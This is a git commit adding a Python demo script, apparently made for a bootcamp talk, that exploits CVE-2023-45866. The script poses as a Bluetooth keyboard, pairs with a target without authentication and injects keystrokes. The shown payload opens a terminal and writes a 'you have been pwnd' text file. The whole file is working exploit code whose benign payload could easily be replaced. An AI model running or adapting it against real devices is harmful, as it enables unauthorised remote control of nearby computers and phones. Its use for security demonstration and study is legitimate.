cf54916b417b1ced678c8ca4cc0fd1208965406d
Adam Malick <82911810+fecten@users.noreply.github.com>
2025-01-16 20:08:12 -0500

    Add files via upload
    These are the 2 files we altered for the demonstration of the CVE-2023-45866 for bootCon 2025 at the University of Toronto Bootcamp. This code was altered from the repo hi_my_name_is_keyboard.

---
+++ demo.py
@@ -0,0 +1,119 @@
+#!/usr/bin/env python3
+
+import argparse
+import re
+import time
+from multiprocessing import Process
+
+from injector.helpers import assert_address, log, run
+from injector.client import KeyboardClient
+from injector.adapter import Adapter
+from injector.agent import PairingAgent
+from injector.hid import Key, Mod
+from injector.profile import register_hid_profile
+
+# parse command line arguments
+parser = argparse.ArgumentParser("keystroke-injection-android-linux.py")
+parser.add_argument("-i", "--interface", required=True)
+parser.add_argument("-t", "--target_address", required=True)
+args = parser.parse_args()
+
+# do a basic sanity check of the provided arguments
+assert_address(args.target_address)
+assert(re.match(r"^hci\d+$", args.interface))
+
+# restart the local Bluetooth daemon
+run(["sudo", "service", "bluetooth", "restart"])
+time.sleep(0.5)
+
+# register a generic HID SDP profile
+profile_proc = Process(target=register_hid_profile, args=(args.interface, args.target_address))
+profile_proc.start()
+
+# setup the adapter
+# - configure name and class
+log.status("configuring Bluetooth adapter")
+adapter = Adapter(args.interface)
+adapter.set_name("Hi, My Name is Keyboard")
+adapter.set_class(0x002540)
+run(["hcitool", "name", args.target_address])
+client = KeyboardClient(args.target_address, auto_ack=True)
+
+# connect to Service Discovery Protocol on the target (L2CAP port 1)
+log.status("connecting to SDP")
+while not client.connect_sdp():
+  log.debug("connecting to SDP")
+adapter.enable_ssp()
+log.success("connected to SDP (L2CAP 1) on target")
+
+# run a NoInputNoOutput pairing agent
+# - this tells the host that we don't support authenticationn
+with PairingAgent(adapter.iface, args.target_address):
+
+  # attempt to connect to HID Control and HID Interrupt on the target
+  client.connect_hid_interrupt()
+  client.connect_hid_control()
+
+  # wait up to 1 second for one of the services to disconnect
+  start = time.time()
+  while (time.time() - start) < 1:
+    if client.c17.connected == False or client.c19.connected == False:
+      break
+    time.sleep(0.001)
+
+  # connect to HID Interrupt on the Mac (L2CAP port 19)
+  if client.c19.connected == False:
+    log.status("connecting to HID Interrupt")
+    while not client.connect_hid_interrupt():
+      log.debug("connecting to HID Interrupt")
+      time.sleep(0.001)
+  log.success("connected to HID Interrupt (L2CAP 19) on target")
+
+  # connect to HID Control on the Mac (L2CAP port 17)
+  if client.c17.connected == False:
+    log.status("connecting to HID Control")
+    while not client.connect_hid_control():
+      log.debug("connecting to HID Control")
+      time.sleep(0.001)
+  log.success("connected to HID Control (L2CAP 17) on target")
+
+# send an empty keyboard report
+client.send_keyboard_report()
+
+# send 10 seconds of 'tab' keypresses
+log.status("opening terminal and nano to write to a text file")
+try:
+    #Open terminal
+    client.send_keypress(Key.LeftControl, Key.LeftAlt, Key.T, Mod.LeftControl, Mod.LeftAlt)
+    time.sleep(3)
+    log.status("open terminal 3 second delay for terminal to open")
+    client.send_ascii("nano SnowdenSentis.txt")
+    time.sleep(0.5)
+    log.status("nano .txt file")
+    client.send_keypress(Key.Enter)
+    time.sleep(1)
+    client.send_ascii("You have been pwnd and are vulernable to CVE-2023-45866")
+    time.sleep(2)
+    client.send_keypress(Mod.LeftControl, Key.X)
+    time.sleep(1)
+    client.send_keypress(Key.Y)
+    time.sleep(1)
+    client.send_keypress(Key.Enter)
+    time.sleep(1)
+    log.status("Saved file")
+    client.send_ascii("cat SnowdenSentis.txt")
+    time.sleep(2)
+    client.send_keypress(Key.Enter)
+    log.status("print file")
+    time.sleep(0.3)
+except KeyboardInterrupt:
+    log.status("Interrupted while sending keystrokes")
+
+# disconnect the L2CAP sockets
+log.success("payload has been transmitted; disconnecting Bluetooth HID client")
+client.close()
+
+# take the adapter offline
+log.status("taking '%s' offline" % args.interface)
+adapter.down()
+profile_proc.terminate()
